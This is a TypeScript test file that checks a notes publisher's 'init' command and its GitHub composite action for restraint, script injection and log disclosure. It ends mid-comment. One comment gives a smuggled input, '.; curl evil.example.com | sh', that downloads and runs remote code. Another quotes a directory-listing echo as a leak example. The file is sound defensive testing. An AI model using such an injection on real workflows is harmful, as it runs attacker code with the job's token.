/**
 * The adoption gates: what `init` writes, and what the Action may do.
 *
 * TK-32's premise is the one every ticket before it deferred — a stranger with a
 * notes repository and no relationship to this project gets a published site by
 * adding one file to it. Two deliverables, and the failure modes are different
 * in kind:
 *
 * - **`init` writes into a repository it does not own.** Every gate here is
 *   therefore about restraint: what it leaves alone, what it refuses to
 *   overwrite, and whether running it twice is the same as running it once.
 *   `scripts/seed-gitignore.ts` already carries the four-state probe and its own
 *   gates in `tests/disclosure.test.ts`; this file gates the *command*, which is
 *   what was missing — TK-25 shipped that module with no caller, and this
 *   project has now had three defects whose whole content was a working unit
 *   nothing reached.
 * - **The Action's log is world-readable.** A public notes repository is the
 *   free adoption path, its workflow logs are retained 90 days, and a withheld
 *   file's basename is an index to it. So `action.yml` is read as data and every
 *   line it can emit is checked against the closed set of things it may say.
 *
 * **The binary is the subject wherever a claim is about behaviour.** Reading
 * `initialise()` proves nothing about `thoughtscape-publish init`, which is the
 * exact distance that hid the three defects above. Every behavioural gate here
 * spawns `bin/thoughtscape-publish.mjs`.
 */

import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import assert from 'node:assert/strict';
import { describe, test } from 'vitest';
import { parse as parseYaml } from 'yaml';

import { CONFIG_TEMPLATE, parseInitArguments } from '../scripts/init-repository.ts';
import { CONFIG_FILENAME, parseConfig, DEFAULTS } from '../scripts/load-config.ts';
import { SEEDED_ENTRIES, SEEDED_HEADER } from '../scripts/seed-gitignore.ts';
import { compilePackage } from '../scripts/compile-package.ts';
import { GROUP_WINDOW } from '../src/lib/collection-navigation.ts';

const ROOT = fileURLToPath(new URL('../', import.meta.url));
const BINARY = join(ROOT, 'bin', 'thoughtscape-publish.mjs');
const ACTION_PATH = join(ROOT, 'action.yml');
const ACTION = readFileSync(ACTION_PATH, 'utf8');

/** Run the shipped binary the way a user does, with both streams as one. */
function cli(cwd: string, ...args: string[]): { status: number | null; output: string } {
  const result = spawnSync(process.execPath, [BINARY, ...args], { cwd, encoding: 'utf8' });
  return { status: result.status, output: `${result.stdout}${result.stderr}` };
}

/** A scratch directory removed when the callback returns, however it returns. */
function scratch<T>(prefix: string, body: (directory: string) => T): T | undefined {
  const directory = mkdtempSync(join(tmpdir(), prefix));
  try {
    return body(directory);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
}

/**
 * `git`, with the ambient ignore chain neutralised.
 *
 * The same argument `tests/disclosure.test.ts` makes for its own copy: this
 * machine has a global `core.excludesFile`, and a gate asserting that a seeded
 * rule is what ignores `dist/` is green **with the seed deleted** on any host
 * carrying a global rule for it. Neutralising the chain is what makes the
 * discrimination real.
 */
function git(cwd: string, ...args: string[]): { status: number; stdout: string } {
  const result = spawnSync('git', ['-c', 'core.excludesFile=', ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYSTEM: '/dev/null' },
  });
  return { status: result.status ?? 1, stdout: result.stdout };
}

/** Every file under a directory, recursively. */
function filesUnder(root: string): string[] {
  const found: string[] = [];
  for (const entry of readdirSync(root, { withFileTypes: true })) {
    const path = join(root, entry.name);
    if (entry.isDirectory()) found.push(...filesUnder(path));
    else found.push(path);
  }
  return found;
}

/** A scratch git repository holding one note, initialised or not. */
function notesRepository(directory: string): void {
  git(directory, 'init', '-q', '.');
  writeFileSync(join(directory, 'alpha.md'), '# Alpha\n\nProse.\n', 'utf8');
}

// ---------------------------------------------------------------------------
// `init`, through the binary
// ---------------------------------------------------------------------------

test('init seeds the ignore rules and the config, through the shipped binary', () => {
  scratch('tk32-init-', (root) => {
    notesRepository(root);

    const run = cli(root, 'init');
    assert.equal(run.status, 0, `init failed:\n${run.output}`);

    // The two halves, on disk. Not "the function returned" — the command has to
    // have reached the filesystem, which is the whole distance between a unit
    // that works and a shipped path that never calls it.
    const ignore = readFileSync(join(root, '.gitignore'), 'utf8');
    for (const entry of SEEDED_ENTRIES) {
      assert.ok(ignore.includes(entry), `init did not seed ${entry} into .gitignore`);
    }
    assert.ok(existsSync(join(root, CONFIG_FILENAME)), `init did not write ${CONFIG_FILENAME}`);

    // Non-vacuity for the ignore half: the entries have to actually ignore, as
    // judged by git rather than by the file's text. Every rule in
    // `seed-gitignore.ts`'s own header is a way for a written line to fail to
    // take effect.
    mkdirSync(join(root, 'dist'), { recursive: true });
    writeFileSync(join(root, 'dist', 'index.html'), '<html></html>', 'utf8');
    assert.equal(
      git(root, 'check-ignore', '-q', '--', 'dist/index.html').status,
      0,
      'the seeded block was written but git does not ignore the build output',
    );
  });
});

test('init is safe to run twice', () => {
  scratch('tk32-twice-', (root) => {
    notesRepository(root);

    assert.equal(cli(root, 'init').status, 0);
    const after = {
      ignore: readFileSync(join(root, '.gitignore'), 'utf8'),
      config: readFileSync(join(root, CONFIG_FILENAME), 'utf8'),
    };

    const second = cli(root, 'init');
    assert.equal(second.status, 0, `the second init failed:\n${second.output}`);

    assert.equal(
      readFileSync(join(root, '.gitignore'), 'utf8'),
      after.ignore,
      'a second init changed .gitignore — the seed is appending rather than probing',
    );
    assert.equal(
      readFileSync(join(root, CONFIG_FILENAME), 'utf8'),
      after.config,
      `a second init rewrote ${CONFIG_FILENAME}`,
    );

    // The stream says so, which is what a user running it again is asking.
    assert.match(second.output, /already ignored/, 'the second run did not report the entries as covered');
    assert.match(second.output, /already present/, 'the second run did not report the config as present');
  });
});

test('init is safe to run twice before git init', () => {
  // The *ordinary* order for a user who reaches for `init` first, and the one
  // the no-repository branch exists for. It needs its own fixture because the
  // gate above runs `git init` first and so only ever exercises the probed path
  // — which is how three runs came to produce three copies of the seeded block
  // with every gate green. `docs/gate-reading.md` case 3: the fixture did not
  // contain the case.
  scratch('tk32-norepo-', (root) => {
    // Stop git discovery at this fixture even when the host's temp directory is
    // nested under an unrelated worktree. A broken gitfile makes the no-repo
    // branch real rather than environmental.
    writeFileSync(join(root, '.git'), 'not a gitdir\n', 'utf8');
    writeFileSync(join(root, 'alpha.md'), '# Alpha\n\nProse.\n', 'utf8');

    assert.equal(cli(root, 'init').status, 0);
    const first = readFileSync(join(root, '.gitignore'), 'utf8');
    for (const entry of SEEDED_ENTRIES) assert.ok(first.includes(entry), `${entry} was not seeded`);

    assert.equal(cli(root, 'init').status, 0);
    assert.equal(
      readFileSync(join(root, '.gitignore'), 'utf8'),
      first,
      'a second init in a directory with no repository appended the block again',
    );

    // The block appears once, counted rather than compared: two runs producing
    // one file that merely *contains* the entries is what the equality above
    // asserts, and this is the sharper statement of the same thing.
    assert.equal(
      first.split(SEEDED_HEADER).length - 1,
      1,
      'the seeded block was written more than once',
    );
  });
});

test('init never overwrites a config the user wrote', () => {
  scratch('tk32-keep-', (root) => {
    notesRepository(root);

    // A real one, with an exclusion in it: this is the file whose loss publishes
    // the notes it was withholding, so the property is not "a file was left
    // alone" but "this content survived".
    const mine = 'title: Field Notes\nexclude:\n  - "drafts/**"\n';
    writeFileSync(join(root, CONFIG_FILENAME), mine, 'utf8');

    assert.equal(cli(root, 'init').status, 0);
    assert.equal(
      readFileSync(join(root, CONFIG_FILENAME), 'utf8'),
      mine,
      'init overwrote the user\'s own configuration, taking their exclusion list with it',
    );
  });
});

test('init refuses a config path that is not a file', () => {
  // `existsSync` answers true for a directory, and with it `init` reported
  // "already present, left unchanged" when there was no configuration at all —
  // measured. The build then failed one command later with `exists but could
  // not be read`, so the user was told the wrong thing by the command whose job
  // is to leave the repository buildable, and the right thing by the command
  // that should not have had to.
  scratch('tk32-notafile-', (root) => {
    notesRepository(root);
    mkdirSync(join(root, CONFIG_FILENAME), { recursive: true });

    const run = cli(root, 'init');
    assert.equal(run.status, 1, `a directory named ${CONFIG_FILENAME} was accepted:\n${run.output}`);
    assert.match(
      run.output,
      /is not a file/,
      'init reported a directory as a present configuration, so the user is told they have one',
    );
  });
});

test('the config init writes changes nothing about the build', () => {
  // The template is entirely commented, and this is what makes writing it
  // unconditionally safe rather than merely tidy: parsed, it must be
  // indistinguishable from the file being absent. A key accidentally left
  // uncommented would configure a stranger's site from a template.
  const parsed = parseConfig(CONFIG_TEMPLATE);
  assert.deepEqual(
    parsed,
    { title: DEFAULTS.title, origin: DEFAULTS.origin, exclude: [] },
    'the seeded template configures something — an absent file and this file must build the same site',
  );

  // And the two spellings agree, which is the property stated rather than the
  // one implied: `parseConfig('')` is what a missing file resolves to.
  assert.deepEqual(parsed, parseConfig(''), 'the template and an empty file parse differently');
});

test('the seeded template names every key the loader accepts', () => {
  // A template is documentation, and documentation drifts silently. This is the
  // gate that turns red when a fourth key is added to `load-config.ts` and
  // nobody remembers this file — the user's only menu of what is configurable
  // would otherwise quietly stop listing it.
  //
  // Read out of the loader's own refusal rather than from a list restated here:
  // an unknown key is rejected with `The keys are title, origin, exclude`, so
  // the loader is asked what its table holds.
  let listed: string[] = [];
  try {
    parseConfig('definitely-not-a-key: 1\n');
    assert.fail('the loader accepted an unknown key, so this gate cannot read its table');
  } catch (error) {
    const message = error instanceof Error ? error.message : '';
    listed = (/The keys are (.+)$/m.exec(message)?.[1] ?? '').split(', ').filter(Boolean);
  }
  assert.ok(listed.length > 0, 'the loader\'s key table could not be read from its own refusal');

  for (const key of listed) {
    assert.match(
      CONFIG_TEMPLATE,
      new RegExp(`^# ${key}:`, 'm'),
      `${CONFIG_FILENAME}'s template does not show the "${key}" key, so a user never learns it exists`,
    );
  }
});

test('init refuses a content directory that does not exist, and says which', () => {
  scratch('tk32-missing-', (root) => {
    notesRepository(root);

    const run = cli(root, 'init', '--content', 'notes-that-are-not-here');
    assert.equal(run.status, 1, `a missing --content was accepted:\n${run.output}`);

    // **The message, not merely the exit code**, and the difference was measured
    // rather than assumed. With the guard removed the run still fails and still
    // writes nothing — `ensureIgnored` cannot find a repository and throws — but
    // it prints the bare literal `build failed`, because the error is not one
    // composed under the disclosure rule and the binary's boundary refuses to
    // print a foreign message. So a gate asserting only the exit code and the
    // absence of files is green with the guard gone, which is exactly the shape
    // `docs/gate-reading.md` warns about: the instrument was not looking at what
    // the guard contributes. What it contributes is a stranger being told what
    // to fix.
    assert.match(
      run.output,
      /content directory not found/,
      'a missing --content failed with an unattributed error rather than one naming what is wrong',
    );

    // Nothing was written — not into the named directory, which does not exist,
    // and not into the working directory either. A half-run `init` that seeded
    // `.gitignore` before failing would leave the user with state they did not
    // ask for and no config.
    assert.ok(!existsSync(join(root, 'notes-that-are-not-here')), 'init created the directory a typo named');
    assert.ok(!existsSync(join(root, '.gitignore')), 'init wrote .gitignore before failing');
    assert.ok(!existsSync(join(root, CONFIG_FILENAME)), 'init wrote a config before failing');
  });
});

test('init writes the config where a build with the same flags will read it', () => {
  // The flag exists for exactly this: `loadConfig` reads the config from the
  // **content** directory, so an `init` writing at the working directory while
  // the user builds `--content notes` produces a configuration that looks
  // applied and is not — this project's recurring failure, installed by the
  // command meant to prevent it.
  scratch('tk32-where-', (root) => {
    git(root, 'init', '-q', '.');
    mkdirSync(join(root, 'notes'), { recursive: true });
    writeFileSync(join(root, 'notes', 'alpha.md'), '# Alpha\n\nProse.\n', 'utf8');

    assert.equal(cli(root, 'init', '--content', 'notes').status, 0);
    assert.ok(
      existsSync(join(root, 'notes', CONFIG_FILENAME)),
      'init wrote the config outside the content directory, where the build does not look for it',
    );

    // The end-to-end half: an exclusion added to the file init wrote must reach
    // a build run with the same flags. Anything less measures a path, not a
    // handoff.
    //
    // Asserted on the *content* of the output rather than on the drop count. A
    // count is the weaker instrument here and was measured wrong on the first
    // run: the config `init` had just written is itself discovered and dropped
    // as `not-markdown`, so the arithmetic reflects this command's own file as
    // much as the user's exclusion. What the exclusion is *for* is that the
    // withheld note reaches no published byte, so that is what is checked, with
    // its presence in the corpus on disk as the non-vacuity half.
    mkdirSync(join(root, 'notes', 'drafts'), { recursive: true });
    writeFileSync(join(root, 'notes', 'drafts', 'secret.md'), '# Secret\n\nzqxwithheld\n', 'utf8');
    writeFileSync(
      join(root, 'notes', CONFIG_FILENAME),
      `${readFileSync(join(root, 'notes', CONFIG_FILENAME), 'utf8')}\nexclude:\n  - "drafts/**"\n`,
      'utf8',
    );

    const build = cli(root, 'build', '--content', 'notes', '--out', 'dist');
    assert.equal(build.status, 0, `the build failed:\n${build.output}`);

    assert.ok(
      readFileSync(join(root, 'notes', 'drafts', 'secret.md'), 'utf8').includes('zqxwithheld'),
      'the withheld token is not in the corpus, so its absence from dist/ proves nothing',
    );
    const leaked = filesUnder(join(root, 'dist')).filter((file) =>
      readFileSync(file, 'utf8').includes('zqxwithheld'),
    );
    assert.deepEqual(
      leaked.map((file) => file.slice(root.length)),
      [],
      'the exclusion in the config init wrote did not reach the build — the withheld note is published',
    );
  });
}, 120_000);

test('init covers the build output of a --content subdirectory', () => {
  // The hole this closes was measured, not theorised: `init --content notes`
  // seeds a root-anchored `/dist/`, and a build whose output lands under
  // `notes/` is not covered by it — `git add -A` staged **41 files** of build
  // output and `check-ignore` exited 1 on every one. Root-anchoring is correct
  // and is why the gap exists, so the fix is an additional entry rather than a
  // looser pattern.
  //
  // Asserted through the binary and through git, on the real artifact: the
  // property is "the user's `git add -A` stages their notes and nothing else",
  // and only a real build produces the files that claim is about.
  scratch('tk32-nested-', (root) => {
    git(root, 'init', '-q', '.');
    mkdirSync(join(root, 'notes'), { recursive: true });
    writeFileSync(join(root, 'notes', 'alpha.md'), '# Alpha\n\nProse.\n', 'utf8');

    assert.equal(cli(root, 'init', '--content', 'notes').status, 0);
    const build = cli(root, 'build', '--content', 'notes', '--out', 'notes/dist');
    assert.equal(build.status, 0, `the build failed:\n${build.output}`);

    // Non-vacuity: there has to be build output to fail to ignore.
    assert.ok(filesUnder(join(root, 'notes', 'dist')).length > 10, 'the build produced almost nothing to ignore');

    git(root, 'add', '-A');
    assert.deepEqual(
      git(root, 'ls-files').stdout.split('\n').filter(Boolean).sort(),
      ['.gitignore', 'notes/alpha.md', `notes/${CONFIG_FILENAME}`].sort(),
      'the build output under the content directory was staged — the seeded rule is anchored at the ' +
        'repository root and does not cover a nested dist/',
    );
  });
}, 120_000);

test('init prints no path and no filename from the user\'s repository', () => {
  // The differential `tests/disclosure.test.ts` uses, applied to this command:
  // two repositories differing only in what the notes are called, and the
  // streams compared byte for byte. Output that varies with a name discloses a
  // name, and this needs no token list.
  const run = (label: string, note: string): string =>
    scratch(`tk32-say-${label}-`, (root) => {
      git(root, 'init', '-q', '.');
      writeFileSync(join(root, note), '# A\n\nProse.\n', 'utf8');
      const result = cli(root, 'init');
      assert.equal(result.status, 0, `init failed:\n${result.output}`);
      return result.output;
    })!;

  const first = run('one', 'alpha.md');
  const second = run('two', 'clients-acme-2026-renewal.md');
  assert.equal(
    first,
    second,
    'init\'s output changed when the corpus was renamed, so it is derived from a filename',
  );

  // And the scratch directory's own path is not in it. The differential above
  // cannot see this on its own: every run gets a different `mkdtemp` path, so a
  // command printing its working directory would differ on both runs for a
  // reason the rename did not cause — which reads as a rename leak and is a
  // second, separate one.
  scratch('tk32-nopath-', (root) => {
    git(root, 'init', '-q', '.');
    writeFileSync(join(root, 'alpha.md'), '# A\n\nProse.\n', 'utf8');
    const result = cli(root, 'init');
    assert.ok(
      !result.output.includes(root),
      'init printed the absolute path of the directory it ran in',
    );
  });
});

test('init is named by the usage text', () => {
  // The failure this project has hit three times: a subcommand exists and no
  // user learns it does. `--help` is where a stranger looks.
  const help = cli(ROOT, '--help');
  assert.equal(help.status, 0);
  assert.match(help.output, /thoughtscape-publish init/, 'the usage text does not name the init command');
});

test('init refuses an unrecognised option without echoing it', () => {
  scratch('tk32-argv-', (root) => {
    notesRepository(root);
    const run = cli(root, 'init', '--clients-acme-2026-renewal');
    assert.equal(run.status, 1, 'an unrecognised option was accepted');
    assert.ok(
      !run.output.includes('clients-acme-2026-renewal'),
      'the refusal echoed the token the user typed, which may be a withheld path wearing two dashes',
    );
  });

  // The parser's own half, where the token's absence from the *message* is the
  // property — the binary's boundary prints `error.message` for a
  // disclosure-checked error, so a token in there reaches the log.
  try {
    parseInitArguments(['--clients-acme-2026-renewal']);
    assert.fail('parseInitArguments accepted an unrecognised option');
  } catch (error) {
    assert.ok(error instanceof Error);
    assert.ok(!error.message.includes('clients-acme'), 'the refusal message carries the token');
  }
});

// ---------------------------------------------------------------------------
// `action.yml`, read as data
// ---------------------------------------------------------------------------

/**
 * Every `run:` body in the action.
 *
 * **Parsed with the `yaml` package rather than by hand, and the hand-written
 * version is why.** It scanned for `^(\s*)run:\s*(.*)$` and took either the
 * inline remainder or the indented block below it, which reads the two forms
 * this file uses and silently under-reads a third: a *multi-line quoted scalar*
 * matches the inline branch and contributes only its first line. A reviewer
 * demonstrated the consequence with a real, valid step —
 *
 *     run: "echo publishing &&
 *       git push origin gh-pages &&
 *       echo $GITHUB_WORKSPACE"
 *
 * — which YAML resolves to one command containing a push and a path echo, and
 * which left **every gate in this file green**: the deploy check, the disclosure
 * check, and the injection check all read the first line only. The count guard
 * could not see it either, because one `run:` line did produce one body.
 *
 * `yaml` is already a dependency, so this is not a new one, and
 * `runs.steps[].run` is exact where a regex is approximate. That is the whole
 * argument: a gate over a hand-parsed subset of a format measures the subset.
 */
function runBodies(): string[] {
  const document = parseYaml(ACTION) as { runs?: { steps?: { run?: unknown }[] } };
  const steps = document.runs?.steps ?? [];
  return steps.map((step) => step.run).filter((run): run is string => typeof run === 'string');
}

test('every run step in the action is readable by these gates', () => {
  // The reader is now `yaml` rather than a regex, so an under-read is a parse
  // error rather than a quiet subset — but the count is still checked, because
  // the failure this guards against is a *step* the gates below never see, and
  // that is worth one assertion regardless of what does the parsing.
  const mentions = ACTION.split('\n').filter(
    (line) => !line.trimStart().startsWith('#') && /(?:^|[\s{,])run:/.test(line),
  ).length;
  assert.ok(mentions > 0, 'the action declares no run steps, so every gate below is vacuous');
  assert.equal(
    runBodies().length,
    mentions,
    'a run step was not read by this parser, so the gates below measure fewer steps than the action has',
  );
});

test('the action is a composite action with no triggers of its own', () => {
  // The distinction that makes this file adoptable at all: a workflow runs, an
  // action is `uses:`d. A file with `on:` at the top level is the former, and a
  // user adding it to their repository would get this repository's CI.
  assert.match(ACTION, /^runs:$/m, 'action.yml declares no runs block');
  assert.match(ACTION, /^\s+using: composite$/m, 'action.yml is not a composite action');
  assert.doesNotMatch(ACTION, /^on:/m, 'action.yml declares triggers, so it is a workflow rather than an action');
  assert.match(ACTION, /^name: \S/m, 'action.yml declares no name');
  assert.match(ACTION, /^description: /m, 'action.yml declares no description, which GitHub requires');

  // LF and no tabs, the two things `.gitattributes` and YAML respectively
  // require, asserted here because this file is not covered by
  // `tests/verify.test.ts`'s equivalent.
  assert.doesNotMatch(ACTION, /\r/, 'action.yml contains CR — .gitattributes declares this repository LF');
  assert.doesNotMatch(ACTION, /^[ ]*\t/m, 'action.yml indents with a tab, which YAML forbids');
});

test('the action deploys nothing and commits nothing', () => {
  // Deployment is a separately approved action, and a build is not authorisation
  // for one. An action that pushed would do it inside a user's own repository
  // with their own token, which is the one place this project must not reach.
  const forbidden = [
    ['git push', /git\s+push/],
    ['git commit', /git\s+commit/],
    ['git add', /git\s+add/],
    ['deploy-pages', /deploy-pages/],
    ['upload-pages-artifact', /upload-pages-artifact/],
    ['wrangler', /wrangler/],
  ] as const;

  const body = runBodies().join('\n');
  for (const [what, pattern] of forbidden) {
    assert.doesNotMatch(body, pattern, `the action runs ${what} — deployment is the user's own step`);
  }
  assert.doesNotMatch(ACTION, /^\s+-\s+uses:/m, 'the action calls another action, which may deploy');
});

test('the action passes user input as data, never interpolated into a script', () => {
  // A `${{ }}` expression inside `run:` is substituted as *text* before bash
  // parses it, so an input of `.; curl evil.example.com | sh` is a second
  // command running with the job's token. The input reaching bash through
  // `env:` is passed as data and is never parsed as script.
  //
  // The rule is written over the *whole* expression class rather than over
  // `inputs.` alone: `github.event.*` is attacker-controlled on many triggers
  // and is the more famous instance of the same defect.
  for (const body of runBodies()) {
    const found = /\$\{\{\s*(?:inputs|github\.event|env)\./.exec(body);
    assert.equal(
      found,
      null,
      `an expression is interpolated into a run: body (${found?.[0]}) — pass it through env: instead, ` +
        'or a value containing a shell metacharacter executes',
    );
  }

  // Non-vacuity, and it is the check that matters: the parser must actually be
  // holding the step that takes the inputs. Without this the assertion above
  // passes on a run where `runBodies()` returned nothing useful.
  assert.ok(
    runBodies().some((body) => body.includes('build --content')),
    'no run step invokes the build, so the interpolation gate above read the wrong thing',
  );
  assert.match(
    ACTION,
    /env:\n(\s+)\w[\w-]*: \$\{\{ inputs\.content-dir \}\}/,
    'the content directory does not reach the build step through env:',
  );
});

test('the action declares an input for every argument it passes', () => {
  // The drift this catches: a `--content` hardcoded to `.` in the run step while
  // the input table advertises `content-dir`, so a user sets it and nothing
  // happens. Both directions are asserted — an input nothing consumes is the
  // same defect seen from the other side.
  //
  // Read out of the `inputs:` block rather than by matching every two-space key
  // in the file, which was the first version and was wrong: `steps:` under
  // `runs:` sits at the same indent, so the gate demanded an environment
  // variable for an input that does not exist and failed on correct code. A
  // structural reader that is right by accident is a gate that will be deleted
  // by whoever it next fails.
  const block = /^inputs:\n((?:[ \t].*\n|\n)*)/m.exec(ACTION)?.[1] ?? '';
  const declared = [...block.matchAll(/^ {2}([a-z][a-z-]*):$/gm)].map(([, name]) => name!);
  assert.ok(declared.length > 0, 'the action declares no inputs, so this gate is vacuous');

  const env = new Map(
    [...ACTION.matchAll(/(\w[\w-]*): \$\{\{ inputs\.([a-z-]+) \}\}/g)].map(([, variable, input]) => [input!, variable!]),
  );
  const body = runBodies().join('\n');
  for (const input of declared) {
    const variable = env.get(input);
    assert.ok(variable, `the "${input}" input is declared but never passed to a step`);
    assert.ok(
      body.includes(`$${variable}`),
      `the "${input}" input reaches a step's env as ${variable} and no run body uses it`,
    );
  }
});

test('the action always qualifies a reviewed release and exposes no bypass input', () => {
  const build = runBodies().find((body) => body.includes('build --content'));
  assert.ok(build, 'no step runs the build');
  assert.match(build, /(?:^|\s)--release(?:\s|$)/, 'the Action can produce an unreviewed deployment artifact');
  const document = parseYaml(ACTION) as { inputs?: Record<string, unknown> };
  assert.deepEqual(
    Object.keys(document.inputs ?? {}).sort(),
    ['content-dir', 'out-dir'],
    'the Action exposes an input outside the two path arguments, which could bypass release qualification',
  );
});

test('the action refuses a shallow clone', () => {
  // The failure documentation does not prevent: a shallow clone produces a site
  // that is valid, renders correctly, and carries wrong dates. So the check is
  // in the action rather than in prose, and it is first, before anything reads a
  // note.
  const bodies = runBodies();
  const guard = bodies.find((body) => body.includes('is-shallow-repository'));
  assert.ok(guard, 'the action does not check for a shallow clone');
  assert.match(guard, /exit 1/, 'the shallow-clone check does not fail the run');
  assert.match(guard, /fetch-depth: 0/, 'the shallow-clone failure does not name the setting that fixes it');
  assert.equal(bodies[0], guard, 'the shallow-clone check is not the first step, so a build runs before it');
});

test('the action prints nothing derived from the user\'s repository', () => {
  // A public notes repository's workflow log is world-readable for 90 days. The
  // rule an implementer applies to a line before writing it: what is printed
  // must be a literal of this file's own source, an integer, or a closed-set
  // rule identifier. Nothing read off the user's filesystem qualifies.
  //
  // **Over every line of every body, not only over `echo`.** The first version
  // matched `^\s*(echo|printf)` and then looked for `$` followed by a word
  // character or a brace, and a reviewer put two lines through it untouched:
  // `echo "$(ls -R .)"` and its backtick spelling, which print every filename in
  // the user's repository. Command substitution is neither `\w` nor `{`, and a
  // bare `ls -R`, `find`, or `cat` is not an echo at all while writing to the
  // same stream. Both restrictions were guesses about the *shape* of a leak;
  // what the rule is actually about is a value this file did not compose
  // reaching stdout, so the scan is over every line and every expansion form.
  //
  // The exemptions are a closed set, which is the same discipline the disclosure
  // rule applies everywhere else. Three kinds, and the distinctions are the whole
  // rule: the variables this file expands into *arguments*; a `git rev-parse
  // --is-shallow-repository` whose output is `true` or `false` and is compared
  // rather than printed; and the `node -p` that reads the entry point out of the
  // *generator's own* `package.json`, whose value is a literal of this package's
  // manifest rather than anything discovered in the user's repository, and which
  // likewise reaches an argument and not the log. A substitution of `ls`,
  // `find`, or `cat` over the workspace has no such bound and is what this gate
  // exists to refuse.
  //
  // Matched against the line's own text rather than by shape, because a shape
  // test over command substitution is what let the first version through.
  const allowed = [
    '$PUBLISH_CONTENT_DIR',
    '$PUBLISH_OUT_DIR',
    '$GITHUB_ACTION_PATH',
    // The pnpm version the install step passes to `npm install -g`. Set by the
    // preceding step from the generator's own `packageManager` key, so its value
    // is a literal of this package's manifest rather than anything discovered in
    // the user's repository — the same standing as `$entry` below. It reaches an
    // argument, not the log.
    //
    // It is a *variable* rather than a `$(node -p …)` deliberately: admitting a
    // second command substitution here would widen a closed allowlist whose
    // whole value is that it is closed, so the value crosses through
    // `$GITHUB_ENV` instead and arrives as an ordinary reference.
    '$PNPM_SPEC',
    '$entry',
    '$(git rev-parse --is-shallow-repository)',
    "$(node -p 'const m=require(process.env.GITHUB_ACTION_PATH+\"/package.json\"); Object.values(m.bin)[0]')",
  ];
  for (const body of runBodies()) {
    for (const line of body.split('\n')) {
      // A comment is not output.
      if (line.trimStart().startsWith('#')) continue;
      for (const [expansion] of line.matchAll(/\$\((?:[^)]*)\)|`[^`]*`|\$\{?\w+\}?/g)) {
        // `startsWith` rather than equality, because the pattern stops at the
        // first `)` and a substitution containing one is therefore reported
        // truncated. The exemption is still exact about what it admits — the
        // truncation is a prefix of a literal spelled out above, and a
        // substitution that merely *begins* like an allowed one still has to
        // begin with the whole allowed command.
        assert.ok(
          allowed.some((permitted) => permitted.startsWith(expansion)),
          `the action expands ${expansion} in "${line.trim()}" — a value read from the user's ` +
            'environment or filesystem must not reach a world-readable log, and command substitution ' +
            'is how a directory listing gets there',
        );
      }
    }
  }

  // **The residual, stated rather than hidden.** This rule sees a *value* being
  // expanded, so it cannot see a command that prints the repository with no
  // expansion at all: `find . -name '*.md'` on its own line stays green, and was
  // measured doing so. Closing that means an allowlist of permitted commands,
  // which is a second rule with its own drift — and the class it would catch is
  // one nobody reaches by accident, where every case this rule *does* catch is
  // an ordinary debugging line somebody adds under pressure. The cheap rule
  // against the likely mistake is the trade; a reader must not take a green here
  // as proof that nothing can print.
  //
  // Non-vacuity: the scan must find an expansion when one is present, or its
  // silence is the silence of a pattern that matches nothing.
  const seen = [...runBodies().join('\n').matchAll(/\$\((?:[^)]*)\)|`[^`]*`|\$\{?\w+\}?/g)];
  assert.ok(seen.length > 0, 'the scan found no expansion at all, so it is not looking at the right text');

  // The other half: the *node* step composes messages too, and its only
  // user-derived value is the Node version, which names nobody. Asserted rather
  // than assumed, so a later edit that adds a path to that message is red.
  const version = runBodies().find((body) => body.includes('engines.node'));
  assert.ok(version, 'the action does not check the Node version');
  assert.doesNotMatch(
    version,
    /console\.error\([^)]*(?:GITHUB_WORKSPACE|process\.cwd|__dirname|GITHUB_ACTION_PATH)/,
    'the version check prints a host path',
  );
});

test('the action resolves the generator from its own checkout', () => {
  // The property that makes this work while the package is unpublished:
  // `$GITHUB_ACTION_PATH` is where the runner checks out the action's own
  // repository, which *is* the generator. A hardcoded relative path would
  // resolve against the user's workspace instead and find nothing.
  const build = runBodies().find((body) => body.includes('build --content'));
  assert.ok(build, 'no step runs the build');
  assert.match(
    build,
    /\$GITHUB_ACTION_PATH/,
    'the binary is not resolved from the action path, so it would be looked for in the user\'s repository',
  );

  // And the entry point it resolves to exists. The action reads it from
  // `package.json`'s `bin` rather than naming a file, so the gate follows the
  // same route — a `bin` key pointing at a file that does not exist is a red run
  // in a stranger's CI and would otherwise be a green suite here.
  const manifest = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as {
    bin: Record<string, string>;
  };
  const entry = Object.values(manifest.bin)[0];
  assert.ok(entry, 'package.json declares no bin, so the action has nothing to resolve');
  assert.ok(
    existsSync(join(ROOT, entry)),
    `package.json's bin names ${entry} and no such file exists in this repository`,
  );
  assert.match(build, /package\.json/, 'the build step does not read the entry point from the manifest');
});

test('the action names the package nowhere, so a rename is one edit', () => {
  // The package will be published under a different name than it now has, and
  // the rename must not be a search. Today this file needs the name nowhere: the
  // binary is reached as a path inside the action's own checkout, and
  // `package.json`'s `bin` key is the single place a filename and a package
  // identifier are tied together.
  //
  // Read from the manifest rather than written here, so this gate keeps working
  // through the rename instead of pinning the name it exists to remove.
  const manifest = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { name: string };
  assert.ok(manifest.name.length > 0, 'package.json declares no name, so this gate is vacuous');

  assert.ok(
    !ACTION.includes(manifest.name),
    `action.yml carries the package name (${manifest.name}); a rename would have to find it here too`,
  );

  // The scope is the half that identifies *this project* rather than what the
  // tool does, and it is what a rename replaces. The unscoped tail is
  // deliberately not checked: measured, it is the word `publish`, which is in
  // the binary's own filename and in the words "the publish tool" — a gate over
  // it fails on correct code and would be deleted by whoever it next stopped.
  // A rule that cannot distinguish an identifier from an English word is not a
  // rule about identifiers.
  const scope = manifest.name.replace(/^@/, '').split('/')[0]!;
  assert.ok(
    !new RegExp(scope, 'i').test(ACTION),
    `action.yml carries this project's name (${scope}); the rename must be one edit, not a search`,
  );

  // Non-vacuity: the scan must be able to find the name at all.
  assert.match(`a line mentioning ${scope}`, new RegExp(scope, 'i'), 'the scan cannot see the name it looks for');
});

test('nothing init writes into a user\'s repository names this project', () => {
  // The standing constraint: this tool is nobody's in particular. A stranger's
  // `.gitignore` and configuration file are files they will read, edit, and
  // commit, and a project's name in either is residue they did not ask for —
  // and, after the rename, residue naming something that no longer exists.
  //
  // The subject is what reaches *their disk*, which is the seeded header and the
